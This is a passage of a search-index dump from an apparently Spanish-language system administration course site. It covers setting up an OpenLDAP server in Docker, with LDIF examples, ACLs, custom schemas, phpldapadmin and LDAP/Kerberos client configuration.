/etc/krb5.conf.d/kcm_default_ccache # This file should normally be installed by your distribution into a # directory that is included from the Kerberos configuration file (/etc/krb5.conf) # On Fedora/RHEL/CentOS, this is /etc/krb5.conf.d/ # # To enable the KCM credential cache enable the KCM socket and the service: # systemctl enable sssd-secrets.socket sssd-kcm.socket # systemctl start sssd-kcm.socket # # To disable the KCM credential cache, comment out the following lines. [ libdefaults ] #default_ccache_name = KCM: Host * GSSAPIAuthentication yes GSSAPIDelegateCredentials yes","title":"Instalaci\u00f3n host  ldap-kerberos"},{"location":"administracion/ldap/host-kerberos-con-ldap/#instalacion-host-ldap-kerberos","text":"sudo dnf install -y nss-pam-ldapd authconfig \\ pam_krb5 krb5-workstation sudo authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --ldapserver = 'ldap.edt.org' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablekrb5 --krb5kdc = 'kserver.edt.org' \\ --krb5adminserver = 'kserver.edt.org' --krb5realm = 'EDT.ORG' \\ --enablemkhomedir \\ --updateall sudo systemctl start nslcd Si al autenticar con un usuario de ldap da el error pam_krb5[10992]: error updating ccache \"KCM:\" comentar la linea de cache KMC en /etc/krb5.conf.d/kcm_default_ccache # cat /etc/krb5.conf.d/kcm_default_ccache # This file should normally be installed by your distribution into a # directory that is included from the Kerberos configuration file (/etc/krb5.conf) # On Fedora/RHEL/CentOS, this is /etc/krb5.conf.d/ # # To enable the KCM credential cache enable the KCM socket and the service: # systemctl enable sssd-secrets.socket sssd-kcm.socket # systemctl start sssd-kcm.socket # # To disable the KCM credential cache, comment out the following lines. [ libdefaults ] #default_ccache_name = KCM: Host * GSSAPIAuthentication yes GSSAPIDelegateCredentials yes","title":"Instalaci\u00f3n host  ldap-kerberos"},{"location":"administracion/ldap/ldap/","text":"ldap autenticaci\u00f3n demostrar quien soy information provides ( info de la cuenta ) authentication provides ( password ) ldap es una base de datos no relacional que es jer\u00e1rquica ( estructura de \u00e1rbol ), ademas puede ser distribuida y esta optimizada para lecturas . el nodo ra\u00edz se compone de: dc = edt,dc = org Estructura El \u00e1rbol de la estructura se denomina DIT +----------------+ | dc=org | +----------------+ | +----------------+ Entidades | dc=edt | +----------------+ | | +-----+ +-------+ Unidades +----------------+ +------------------+ organizativas | | | | ou=usuarios | | ou=maquinas | +----------------+ +------------------+ Usuarios | +---------------------+ +----------------+ +----------------+ | uid=pedro | | uid=anna | | sn=lopez | | sn=gomez | | ... | | ... | +----------------+ +----------------+ Los diferentes tipos de entidad se refieren a los recuadros y cada una de ellas tiene sus atributos (datos) referente a ella. como por ejemplo la entidad de Usuarios tiene atributos como uid, sn, etc... Cada entidad es un tipo de objeto, esto lo veremos en los archivos de configuraci\u00f3n por ejemplo: edt,org pertenece al objeto o organization usuarios, maquinas son el objeto ou organizationunit. los usuarios posixacount,inetorgperson ldap crea un directorio /var/lib/ldap y /etc/openldap/slapd.d donde esta la configuraci\u00f3n en formato .ldapd estos directorios son del usuario ldap:ldap y siempre a de ser as\u00ed. si los modificamos como root tendremos que cambiarlo al usuario original al acabar los cambios. dn distingished name nom=pep,ou=usuaris,dn=edt,dc=org Ficheros datos .ldif es la extensi\u00f3n de los datos de ldap con estos ficheros cargaremos y modificaremos los datos. organitzacio_edt.org contiene 4 entidades con diferentes atributos, ser\u00eda un ejemplo de estructura. dn: dc = edt,dc = org dc: edt description: Escola del treball de Barcelona objectClass: dcObject objectClass: organization o: edt.org dn: ou = maquines,dc = edt,dc = org ou: maquines description: Container per a maquines linux objectclass: organizationalunit dn: ou = clients,dc = edt,dc = org ou: clients description: Container per a clients linux objectclass: organizationalunit dn: ou = productes,dc = edt,dc = org ou: productes description: Container per a productes linux objectclass: organizationalunit dn: ou = usuaris,dc = edt,dc = org ou: usuaris description: Container per usuaris del sistema linux objectclass: organizationalunit usuaris_edt.org En este ejemplo se ve los datos para introducir varios usuarios, no todos los atributos son necesarios los obligatorios para un usuario posixAccount son: sn, cn, uid, uidNumber, gidNumber, homeDirectory dn: cn = Pau Pou,ou = usuaris,dc = edt,dc = org objectclass: posixAccount objectclass: inetOrgPerson cn: Pau Pou cn: Pauet Pou sn: Pou homephone: 555 -222-2220 mail: pau@edt.org description: Watch out for this guy ou: Profes uid: pau uidNumber: 5000 gidNumber: 100 homeDirectory: /tmp/home/pau userPassword: { SSHA } NDkipesNQqTFDgGJfyraLz/csZAIlk2/ dn: cn = Pere Pou,ou = usuaris,dc = edt,dc = org objectclass: posixAccount objectclass: inetOrgPerson cn: Pere Pou sn: Pou homephone: 555 -222-2221 mail: pere@edt.org description: Watch out for this guy ou: Profes uid: pere uidNumber: 5001 gidNumber: 100 homeDirectory: /tmp/home/pere userPassword: { SSHA } ghmtRL11YtXoUhIP7z6f7nb8RCNadFe+ Ficheros de configuraci\u00f3n podemos modificar los datos de configuraci\u00f3n de diferentes maneras, desde bajo nivel con los ficheros que empiezan con s como slapd.conf o de forma de alto nivel desde comandos como ldapadd slapf-edt.org.conf Es el fichero de configuraci\u00f3n del demonio donde incluye los diferentes schemas de ldap, configuraci\u00f3n de la base de datos, control de acceso, etc... configuraci\u00f3n de la base de datos: ... database mdb suffix \"dc=edt,dc=org\" rootdn \"cn=Manager,dc=edt,dc=org\" rootpw secret directory /var/lib/ldap ... database es el tipo de base de datos que queremos suffix el nombre de la base de datos rootdn/rootpw Usuario con privilegios virtual ( administrador ) .... # ACL for this database access to * by self write by * read ... permisos de acceso a la base de datos. Pasos de instalaci\u00f3n en docker docker run --name ldapserver -it --hostname ldapserver fedora:27 /bin/bash Ya dentro del contenedor dnf update vi dnf install -y vim procps iputils iproute tree nmap mlocate man dnf install -y openldap-clients openldap-servers esto crea un directorio /var/lib/ldap con el usuario ldap y siempre a de ser as\u00ed tambi\u00e9n crea /etc/openldap/slapd.d donde esta la configuraci\u00f3n en formato .ldapd Generar la base de datos Borraremos toda la configuraci\u00f3n por defecto y crearemos la que deseamos desde el archivo slapd.conf y DB_CONFIG , estos dos archivos son los necesarios para generar la configuraci\u00f3n de los datos. slaptest genera la configuraci\u00f3n inicial en /etc/openldap/slapd.d/ desde el fichero slapd.conf copiamos dentro del contenedor los archivos que necesitaremos. mkdir /opt/docker # desde el host al contenedor docker cp slapd-edt.org.conf ldapserver:/opt/docker docker cp DB_CONFIG ldapserver:/opt/docker docker cp usuaris_edt.org.ldif ldapserver:/opt/docker docker cp organitzacio_edt.org.ldif ldapserver:/opt/docker Borrar contenido por defecto rm -rf /var/lib/ldap/* rm -rf /etc/openldap/slapd.d/* Generar base de datos cp DB_CONFIG /var/lib/ldap/ slaptest -f slapd-edt.org.conf # valida el archivo de configuracion slaptest -f slapd-edt.org.conf -u slaptest -f slapd-edt.org.conf -F /etc/openldap/slapd.d/ slaptest -f slapd-edt.org.conf -F /etc/openldap/slapd.d/ -u En este momento se a creado la base de datos pero nada m\u00e1s, aun no contiene datos. Comprobar con slapcat o slapcat -n0 la configuraci\u00f3n del servidor. DB_CONFIG es un archivo binario que ayuda a la base de datos a ser mas optima en el rendimiento Generar estructura El siguiente paso ser\u00eda el populate (cargar los datos ) . Cargar los datos de forma cliente mediante las ordenes ldapadd con el protocolo ldap o cargar entradas masivas en forma de servidor con slapadd . De marera masiva, desde el servidor ( el servicio tiene que estar apagado ). # cargo estructura slapadd -F /etc/openldap/slapd.d/ -l organitzacio_edt.org.ldif # # se podrian cargar tambi\u00e9n nlos usuarios en este paso pero lo dejamos para ver las 2 maneras. # compruebo estructura slapcat chown -R ldap:ldap /etc/openldap/slapd.d/ chown -R ldap:ldap /var/lib/ldap/ Al generar datos de esta manera los archivos cambian de usuario y grupo, por lo tanto les devolvemos sus usuario y grupo originales ldap:ldap Arrancar servicio /sbin/slapd ldap funciona en el puerto 389/tcp , as\u00ed que mapeando ese puerto podemos ver si esta activo. Comprobar ldapsearch -x -LLL -b 'dc=edt,dc=org' ldapsearch -x -LLL -b 'dc=edt,dc=org' dn ldapsearch -x -LLL -b 'dc=edt,dc=org' description ldapsearch -x -LLL -b 'dc=edt,dc=org' + ldapsearch -x -LLL -b 'dc=edt,dc=org' -h 172 .17.0.2 -LLL formato ldif -b base search -x evitar identificaci\u00f3n avanzada -h host Cliente ldap El cliente ldap tiene que indicar que servidor tiene que consultar, por lo tanto se lo indicamos en el archivo de configuraci\u00f3n del cliente /etc/openldap/ldap.conf ... URI ldap://ldapserver BASE dc = edt,dc = org comprobar que funciona ldapwhoami -x -h 172 .17.0.2 ldapwhoami -x -h 172 .17.0.2 -D 'cn=Manager,dc=edt,dc=org' -w secret Insertar datos desde cliente ldapadd -x -h 172 .17.0.2 -f usuaris_edt.org.ldif -D 'cn=Manager,dc=edt,dc=org' -w secret ldapadd -x -h 172 .17.0.2 -f usuaris_edt.org.ldif -D 'cn=Manager,dc=edt,dc=org' -W Generar imagen docker Todo esto se a creado dentro de un contenedor de docker, pasaremos ese contenedor a imagen para futuros usos. docker commit ldapserver jorgepastorr/ldapserver19 Arrancar de nuevo En este caso ya no queremos un contenedor interactivo por lo tanto le indicaremos un -d docker run --rm -d jorgepastorr/ldapserver19 /sbin/slapd -d0 -d0 argumento de slapd para que quede en forgraund -d detach demonios del sistema se ejecutan en background los demonios de container se ejecutan en forgraund. Dockerfile # ldapserver FROM fedora:27 LABEL version = \"1.0\" LABEL author = \"@jorgepastorr\" RUN dnf -y install openldap-servers openldap-clients RUN mkdir /opt/docker COPY * /opt/docker/ RUN chmod +x /opt/docker/startup.sh CMD /opt/docker/startup.sh install.sh #!/bin/bash # install ldapserver rm -rf /etc/openldap/slapd.d/* rm -rf /var/lib/ldap/* cp /opt/docker/DB_CONFIG /var/lib/ldap/. slaptest -f /opt/docker/slapd-edt.org.conf -F /etc/openldap/slapd.d/ slapadd -F /etc/openldap/slapd.d -l /opt/docker/organitzacio_edt.org.ldif slapadd -F /etc/openldap/slapd.d -l /opt/docker/usuaris_edt.org.ldif chown -R ldap:ldap /etc/openldap/slapd.d chown -R ldap:ldap /var/lib/ldap cp /opt/docker/ldap.conf /etc/openldap/. startup.sh #!/bin/bash bash /opt/docker/install.sh /sbin/slapd -d0 Importante: Si tenemos que arrancar el contenedor en m\u00e1quinas limitadas como amazon es posible tener que a\u00f1adir unlimit -n 1024 antes de la linea de arrancar el servicio ldapd. Generar imagen con Dockerfile Estando en el directorio donde se encuentra el Dockerfile . \u251c\u2500\u2500 DB_CONFIG \u251c\u2500\u2500 Dockerfile \u251c\u2500\u2500 install.sh \u251c\u2500\u2500 ldap.conf \u251c\u2500\u2500 organitzacio_edt.org.ldif \u251c\u2500\u2500 slapd-edt.org.conf \u251c\u2500\u2500 startup.sh \u2514\u2500\u2500 usuaris_edt.org.ldif Es importante que este directorio no sea muy pesado ya que al crear la imagen copiara todo su contenido. # generar imagen docker build -t ldapserver:base . # arrancar contenedor docker run --rm -d --name ldapserver -h ldapserver -p 389 :389 ldapserver:base El profe quiere/dice Siempre que tengamos que copiar archivos dentro de una imagen hacerlo en /opt/docker La instalaci\u00f3n b\u00e1sica la har\u00e1 el Dockerfile y la configuraci\u00f3n el archivo install.sh que lo ejecutara startup.sh que como ultima opci\u00f3n siempre tendr\u00e1 un servicio en foregraund. El entrypoint de la linea de comandos tiene mas poder que el del dockerfile, si no ponemos ninguno ejecutara el del dockerfile, si pongo un entrypoint en el docker run este anulara el del Dockerfile y lo remplazara. -p local:container -p389:389 docker history ldapserver19:base Cliente filtrar, modificar, a\u00f1adir, eliminar. B\u00fasquedas ldapsearch -x -LLL -h 172 .17.0.2 -b 'dc=edt,dc=org' '(|(cn=* Mas)(cn=* Pou))' dn ldapsearch -x -LLL -b 'dc=edt,dc=org' '(&(cn=* Mas)(ou=Profes))' dn ldapsearch -x -LLL -b 'dc=edt,dc=org' '(&(|(cn=* Mas)(cn=* Pou))(gidNumber=600))' ldapsearch -x -LLL -b 'ou=usuaris,dc=edt,dc=org' 'uidNumber>=5000' dn uidNumber ldapsearch -x -LLL -b 'dc=edt,dc=org' -s sub ldapsearch -x -LLL -b 'dc=edt,dc=org' -s base ldapsearch -x -LLL -b 'dc=edt,dc=org' -s one ldapsearch -x -LLL -b 'dc=edt,dc=org' -s children ldapsearch -x -LLL -b 'dc=edt,dc=org' + # atributos operacionales, lenguaje ldap -s sub es la salida est\u00e1ndar -s base es el primer nivel del \u00e1rbol de la base de datos -s one es el segundo nivel ( los grupos ) -s children del segundo nivel incluido hasta el ultimo ( grupos y usuarios ) A\u00f1adir ldapadd -x -D cn = Manager,dc = edt,dc = org -w secret -f /tmp/ldap/usuario_nuevo.ldif La opci\u00f3n -c permite en el caso de a\u00f1adir un elemento y falle pase al siguiente y no pare todo el proceso. usuario_nuevo.ldif dn: cn = Pau Maria Pou,ou = usuaris,dc = edt,dc = org objectClass: posixAccount objectClass: inetOrgPerson cn: Pau Maria Pou sn: Pou ou: Profes uid: pau uidNumber: 5000 gidNumber: 100 homeDirectory: /tmp/home/pau userPassword:: e1NTSEF9TkRraXBlc05RcVRGRGdHSmZ5cmFMei9jc1pBSWxrMi8 = mail: modme@example.com homePhone: 111 -222-333 description: nueva descripcion para Pau Pou Eliminar ldapdelete -x -D cn = Manager,dc = edt,dc = org -w secret 'cn=Pau Pou,ou=usuaris,dc=edt,dc=org' ldapdelete -x -D cn = Manager,dc = edt,dc = org -w secret -f modificaciones.ldif Modificar ldapmodify -x -D cn = Manager,dc = edt,dc = org -w secret -f modificaciones.ldif changetype: <[modify|add|delete|modrdn]> Modify modificaciones.ldif dn: cn = Pau Pou,ou = usuaris,dc = edt,dc = org changetype: modify replace: mail mail: modme@example.com - replace: homePhone homephone:111-222-333 - delete: description dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: modify add: description description: nueva descripcion para Anna Pou borrar todos los cn repetidos y dejar solo 1 dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: modify replace: cn cn: Anna Pou modificaciones.ldif dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: delete ldapdelete -x -r -D cn = Manager,dc = edt,dc = org -w secret \"ou=usuaris,dc=edt,dc=org\" Ojo opci\u00f3n -r recursivo que borra toda su descendencia Add modificaciones.ldif dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: add objectClass: posixAccount objectClass: inetOrgPerson cn: Anna Pou cn: Anita Pou sn: Pou mail: anna@edt.org ou: Alumnes uid: anna uidNumber: 5002 gidNumber: 600 homeDirectory: /tmp/home/anna userPassword:: e1NTSEF9Qm00QjNCdS9mdUg2QmJ5OWxneGZGQXdMWXJLMFJiT3E = description: modified description homePhone: 93 -222-333 Modrdn modificaciones.ldif dn: cn = Pau Pou,ou = usuaris,dc = edt,dc = org changetype: modrdn newrdn: cn = Pau Maria Pou deleteoldrdn: 0 deleteoldrdn 0 | 1 se refiere a si quieres remplazar el ultimo registro de cn o solo a\u00f1adir uno nuevo. dn: cn = Anna Woman,ou = usuaris,dc = edt,dc = org changetype: modrdn newrdn: cn = Anna Elder deleteoldrdn: 1 newsuperior: ou = consumidors,dc = edt,dc = org newsuperior modificar ruta del usuario Modificar desde linea de comando. ldapmodrdn -x -D cn = Manager,dc = edt,dc = org -w secret 'cn=Anna Puig,ou=usuaris,dc=edt,dc=org' 'cn=Annita Puig' Ldapcompare ldapcompare sirve para verificar datos en scripts, muestra cierto en el caso que el dato sea correcto. ldapcompare -x -h 172 .17.0.2 'cn=Anna pou,ou=usuaris,dc=edt,dc=org' mail:anna@edt.org TRUE getent permite validar obtener la informaci\u00f3n de los usuarios del sistema independientemente de donde vengan. getent passwd <usuario> getent group <grupo> ldapurl -h 172 .17.0.2 -b dc = edt,dc = org -s sub ldapurl -H ldap://172.17.0.2:389/dc = edt,dc = org?dn,mail?sub? ( cn = Pau Pou ) Password Cliente ldappasswd -x -h 172 .17.0.2 -D 'cn=user10,ou=usuaris,dc=edt,dc=org' -w jupiter -s user10 -w antiguo pasword -s nuevo pasword Servidor generar contrase\u00f1as para a\u00f1adir al archivo de usuarios. slappasswd -h { SSHA } | { CRYPT } | { md5 } New password: Re-enter new password: jupiter { SHA } ovf8ta/reYP/u2zj0afpHt8yE1A = por defecto ya la genera {SHA} no hace falta la opci\u00f3n -h M\u00faltiples bases de datos slapd.conf ... # ---------------------------------------------------------------------- database mdb suffix \"dc=edt,dc=org\" rootdn \"cn=Manager,dc=edt,dc=org\" rootpw secret directory /var/lib/ldap.edt.org index objectClass eq,pres access to * by self write by * read # ---------------------------------------------------------------------- database mdb suffix \"dc=m06,dc=cat\" rootdn \"cn=Root,dc=m06,dc=cat\" rootpw jupiter directory /var/lib/ldap.m06.cat index objectClass eq,pres access to * by self write by * read # -------------------------------------------------------- database config rootdn \"cn=Sysadmin,cn=config\" rootpw { SSHA } 5DfZc1WXeIwrP7C3fr23WLZiPZ5YHMgA # enable monitoring database monitor la instalaci\u00f3n cambia un poco a la original, cada base de datos tendr\u00e1 su propio directorio. rm -rf /etc/openldap/slapd.d/* rm -rf /var/lib/ldap/* mkdir /var/lib/ldap.m06.cat mkdir /var/lib/ldap.edt.org cp /opt/docker/DB_CONFIG /var/lib/ldap.m06.cat/. cp /opt/docker/DB_CONFIG /var/lib/ldap.edt.org/. slaptest -f /opt/docker/slapd.conf -F /etc/openldap/slapd.d/ slapadd -F /etc/openldap/slapd.d -l /opt/docker/edt.org.ldif # especifico en que base de datos inyectar los elementos con -b slapadd -b 'dc=m06,dc=cat' -F /etc/openldap/slapd.d -l /opt/docker/m06.cat.ldif chown -R ldap:ldap /etc/openldap/slapd.d chown -R ldap:ldap /var/lib/ldap chown -R ldap:ldap /var/lib/ldap.m06.cat chown -R ldap:ldap /var/lib/ldap.edt.org cp /opt/docker/ldap.conf /etc/openldap/. /etc/openldap/slap.d config /var/lib/ldab.edt.org /var/lib/ldab.m06.cat /var/lib/ldap slapcat > back.ldap.dump Backup backup del directorio de de configuracion y de datos o con slapcat un fichero ldif Acl Las acl son los permisos que tendr\u00e1 cada usuario respecto a las bases de datos La base de datos config se crea por defecto, pero si no la especificas en el archivo slapd.conf el nombre y la contrase\u00f1a de rootdn y rootpw ser\u00e1n aleatorios, y no podr\u00e1s configurar los permisos. database config rootdn \"cn=Sysadmin,cn=config\" rootpw { SSHA } 8a7gp+odUWaevnLbf+9eJK9y3lTbMonq ldapmodify -x -D 'cn=Sysadmin,cn=config' -w syskey -f acl.ldif A tener en cuenta Por defecto si no se especifica ninguna acl esta es access to * by * read En cuanto a\u00f1ades cualquier acl por defecto se implementara en ultimo lugar access to * by * none El usuario especificado como rootdn no le afectar\u00e1n en ning\u00fan caso las reglas de acl El usuario anonymous en ning\u00fan caso podr\u00e1 modificar alg\u00fan dato. Primero se implementaran las reglas de la base de datos y seguidamente las globales La posici\u00f3n de las reglas ir\u00e1n de mas restrictivas a menos. Sintaxis de la implantaci\u00f3n de reglas access to <what> [ by <who> [ <access> ] [ <control> ] ] + <level> :: = none | disclose | auth | compare | search | read | { write | add | delete } | manage what se refiere a que atributo afecta. who quien esta afectado, usuario, grupo, etc... access tipo de acceso que se va a tener Cuando coinciden dos o mas what solo se implementar\u00e1 el primero. # sintaxis erronea access to attrs = homePhone by dn.exact = \u201dcn = Anna Pou,ou = usuaris,dc = edt,dc = org\u201d write access to attrs = homePhone by dn.exact = \u201dcn = Admin System,ou = usuaris,dc = edt,dc = org\u201d write access to attrs = homePhone by * read # sintaxis correcta access to attrs = homePhone by dn.exact = \u201dcn = Anna Pou,ou = usuaris,dc = edt,dc = org\u201d write by dn.exact = \u201dcn = Admin System,ou = usuaris,dc = edt,dc = org\u201d write by * read Ojo con el atributo userPassword access to attrs = userPassword by self write by * auth [ by * none ] access to * by * read Ejemplo de modificaci\u00f3n. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = homePhone by * read olcAccess: to * by * write slapacl Es una manera de ver los permisos rapidamente para una acci\u00f3n # permisos generales de usuario slapacl -b 'cn=Marta Mas,ou=usuaris,dc=edt,dc=org' entry: read (= rscxd ) children: read (= rscxd ) .... # marta mas puede leer su pasword? slapacl -b 'cn=Marta Mas,ou=usuaris,dc=edt,dc=org' -D 'cn=Marta Mas,ou=usuaris,dc=edt,dc=org' userpassword/read read access to userPassword: ALLOWED Schemas /etc/openldap/schema En los elementos de la base de datos se le a\u00f1aden objetos y atributos que est\u00e1n definidos en los archivos schema , estos atributos son los que nos ayudan a cargar los datos. Por defecto ya vienen predefinidos los objetos necesarios para su correcto funcionamiento, pero si queremos objetos adicionales se tienen que crear manualmente. Tipos de objeto Toda entidad tiene que tener un objeto structural, ademas puede tener mas objetos auxiliares. Structural : Es el objeto principal por el que se identificara a ese elemento, por ejemplo una persona. nombre, id, apellido. Auxiliary : Es un objeto que aporta informaci\u00f3n extra al structural, por ejemplo datos de gimnasio. foto, vestuario, clases. Descendencia Los objetos pueden descender de TOP o de otro objeto. El caso es que si desciende de TOP y es un objeto structural se tiene que a\u00f1adir un atributo para identificar el futuro elemento, en el caso de ser auxiliar no hay ning\u00fan problema. Si un objeto desciende de otro objeto, este heredar\u00e1 los atributos del objeto superior. Identificadores OID (sistema de implantaci\u00f3n de n\u00fameros \u00fanicos) Identificadores \u00fanicos para tipo de caracteres. Name OID Description boolean 1.3.6.1.4.1.1466.115.121.1.7 boolean value directoryString 1.3.6.1.4.1.1466.115.121.1.15 Unicode (UTF-8) string distinguishedName 1.3.6.1.4.1.1466.115.121.1.12 LDAP DN integer 1.3.6.1.4.1.1466.115.121.1.27 integer numericString 1.3.6.1.4.1.1466.115.121.1.36 numeric string OID 1.3.6.1.4.1.1466.115.121.1.38 object identifier octetString 1.3.6.1.4.1.1466.115.121.1.40 arbitrary octets Identificadores \u00fanicos para tipo de objetos, atributos, elementos. OID Assignment 1.1 Organization's OID 1.1.1 SNMP Elements 1.1.2 LDAP Elements 1.1.2.1 AttributeTypes 1.1.2.1.1 x-my-Attribute 1.1.2.2 ObjectClasses 1.1.2.2.1 x-my-ObjectClass importante : En una base de datos ldap un identificador \u00fanico en un objeto, atributo, etc... no se pueden repetir, por lo tanto si creo un atributo su id ser\u00e1 1.1.2.1.1 y el siguiente 1.1.2.1.2 y as\u00ed consecutivamente. Objetos diferentes combinaciones del mismo objeto. objectclass ( 1.1.2.2.1 NAME 'x-futbolistes' DESC 'futboleros' SUP TOP AUXILIARY MUST x-equip MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) objectclass ( 1.1.2.2.1 NAME 'x-futbolistes' DESC 'futboleros' SUP TOP STRUCTURAL MUST ( lonom $ x-equip ) MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) objectclass ( 1.1.2.2.1 NAME 'x-futbolistes' DESC 'futboleros' SUP inetOrgPerson STRUCTURAL MUST x-equip MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) DESC : descripcion SUP : descendencia, de donde desciende. ESTRUCTURAL/AUXILIARY : tipo de objeto MUST : Atributos obligatorio del objeto MAY : atributos opcionales Atributos attributetype ( 1.1.2.1.1 NAME 'x-equip' DESC 'EQUIP DEL FUTBOLISTA' EQUALITY caseIgnoreMatch SUBSTR caseIgnoreSubstringsMatch SYNTAX 1.3.6.1.4.1.1466.115.121.1.15 SINGLE-VALUE) DESC : descripci\u00f3n EQUALITY : para restringir si es igual o no un nombre SUBSTR : para restringir la b\u00fasqueda SYNTAX : tipo de atributo SINGLE-VALUE : valor \u00fanico, no se puede repetir. Ejemplo schema attributetype ( 1.1 . 2.1 . 1 NAME 'x-equip ' DESC 'EQUIP DEL FUTBOLISTA ' EQUALITY caseIgnoreMatch SUBSTR caseIgnoreSubstringsMatch SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 15 SINGLE-VALUE ) attributetype ( 1.1 . 2.1 . 2 NAME 'x-dorsal ' DESC 'dorsal de futbolista ' SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 27 SINGLE-VALUE ) attributetype ( 1.1 . 2.1 . 3 NAME 'x-web ' DESC 'pagina web del futbolista ' EQUALITY caseIgnoreMatch SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 15 ) attributetype ( 1.1 . 2.1 . 4 NAME 'x-foto ' DESC 'foto del futbolista ' SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 40 ) attributetype ( 1.1 . 2.1 . 5 NAME 'x-lesionat ' DESC 'futbolista lesionat ' SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 7 SINGLE-VALUE ) objectclass ( 1.1 . 2.2 . 1 NAME 'x-futbolistes ' DESC 'futboleros ' SUP TOP AUXILIARY MUST x-equip MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) Gestores gr\u00e1ficos Existen diferentes gestores gr\u00e1ficos para modificar, a\u00f1adir, eliminar contenido en el servidor ldap. Estos son gq y phpldapadmin , los dos realizan las mismas funciones. GQ es mas simple de instalar pero menos fiable dnf install gq . phpldapadmin tiene una peque\u00f1a configuraci\u00f3n y requiere un apache, pero es mas fiable. phpldapadmin instalaci\u00f3n dnf install phpldapadmin php-xml httpd systemctl start httpd configuraci\u00f3n con ldap # vim /etc/phpldapadmin/config.php $servers ->newServer ( 'ldap_pla' ) ; $servers ->setValue ( 'server' , 'name' , 'Local LDAP Server' ) ; $servers ->setValue ( 'server' , 'host' , '172.17.0.2' ) ; // ip o hostame de servidor ldap $servers ->setValue ( 'server' , 'port' ,389 ) ; $servers ->setValue ( 'server' , 'base' ,array ( 'dc=edt,dc=org' )) ; $servers ->setValue ( 'login' , 'auth_type' , 'session' ) ; $servers ->setValue ( 'server' , 'tls' ,false ) // $servers ->setValue ( 'appearance' , 'password_hash' , 'ssha' ) ; // comentada perqu\u00e8 generava un error // $servers ->setValue ( 'login' , 'attr' , 'uid' ) ; // comentada perqu\u00e8 generava un error configuraci\u00f3n para acceso remoto # vim /etc/httpd/config.d/phpldapadmin.conf Alias /phpldapadmin /usr/share/phpldapadmin/htdocs Alias /ldapadmin /usr/share/phpldapadmin/htdocs <Directory /usr/share/phpldapadmin/htdocs> <IfModule mod_authz_core.c> Require all granted </IfModule> <IfModule !mod_authz_core.c> Allow from * </IfModule> </Directory> Por defecto phpldapadmin solo acepta acceso desde localhost, con esta configuraci\u00f3n aceptara acceso remoto de cualquiera. localhost/phpldapadmin Docker Dockerfile # phpldapadmin FROM fedora:27 LABEL version = \"1.0\" LABEL author = \"@jorgepastorr\" RUN dnf -y install phpldapadmin php-xml httpd RUN mkdir /opt/docker COPY * /opt/docker/ RUN chmod +x /opt/docker/startup.sh WORKDIR /opt/docker CMD /opt/docker/startup.sh install.sh #!/bin/bash cp /opt/docker/phpldapadmin.conf /etc/httpd/conf.d/ cp /opt/docker/config.php /etc/phpldapadmin/ startup.sh #!/bin/bash bash /opt/docker/install.sh /sbin/php-fpm /sbin/httpd -D FOREGROUND \u279c tree . \u251c\u2500\u2500 config.php \u251c\u2500\u2500 Dockerfile \u251c\u2500\u2500 install.sh \u251c\u2500\u2500 phpldapadmin.conf \u2514\u2500\u2500 startup.sh docker build -t phpldapadmin . docker run -h phpldapadmin --name phpldapadmin -d -p 80 :80 phpldapadmin Configurar cliente ldap En todos los clientes que vallan a tener acceso al servidor ldap, tienen que tener la siguiente configuraci\u00f3n. Paquetes necesarios : authconfig nss-pam-ldapd Primero es bueno verificar que podemos conectar con el servidor, con el paquete openldap-clients . A\u00f1adimos ruta al archivo de configuraci\u00f3n: /etc/openldap/ldap.conf ... URI ldap://ldapserver BASE dc = edt,dc = org Comprobamos con ldapsearch -x -LLL dn . Configuraci\u00f3n de acceso al servidor para el acceso a los usuarios, se necesita modificar el archivo /etc/pam.d/system-auth , pero lo aremos autom\u00e1ticamente con authconfig authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall El comando anterior comando a modificado los siguientes archivos y system-auth /etc/nslcd.conf ... uri ldap://ldapserver base dc = edt,dc = org ... /etc/nsswitch.conf ... passwd: files ldap systemd shadow: files ldap group: files ldap systemd ... En este momento ya tenemos ldap.conf con la b\u00fasqueda predefinida a nuestro servidor ldap, para que funcionen los comandos ldapsearch etc.. nslcd.conf para que el sistema conecte con el servidor ldap. nsswitch.conf para que el sistema mire los archivos passwd, shadow, group en el orden establecido. Comprobamos con getent passwd .","title":"ldap"},{"location":"administracion/ldap/ldap/#ldap","text":"autenticaci\u00f3n demostrar quien soy information provides ( info de la cuenta ) authentication provides ( password ) ldap es una base de datos no relacional que es jer\u00e1rquica ( estructura de \u00e1rbol ), ademas puede ser distribuida y esta optimizada para lecturas . el nodo ra\u00edz se compone de: dc = edt,dc = org","title":"ldap"},{"location":"administracion/ldap/ldap/#estructura","text":"El \u00e1rbol de la estructura se denomina DIT +----------------+ | dc=org | +----------------+ | +----------------+ Entidades | dc=edt | +----------------+ | | +-----+ +-------+ Unidades +----------------+ +------------------+ organizativas | | | | ou=usuarios | | ou=maquinas | +----------------+ +------------------+ Usuarios | +---------------------+ +----------------+ +----------------+ | uid=pedro | | uid=anna | | sn=lopez | | sn=gomez | | ... | | ... | +----------------+ +----------------+ Los diferentes tipos de entidad se refieren a los recuadros y cada una de ellas tiene sus atributos (datos) referente a ella. como por ejemplo la entidad de Usuarios tiene atributos como uid, sn, etc... Cada entidad es un tipo de objeto, esto lo veremos en los archivos de configuraci\u00f3n por ejemplo: edt,org pertenece al objeto o organization usuarios, maquinas son el objeto ou organizationunit. los usuarios posixacount,inetorgperson ldap crea un directorio /var/lib/ldap y /etc/openldap/slapd.d donde esta la configuraci\u00f3n en formato .ldapd estos directorios son del usuario ldap:ldap y siempre a de ser as\u00ed. si los modificamos como 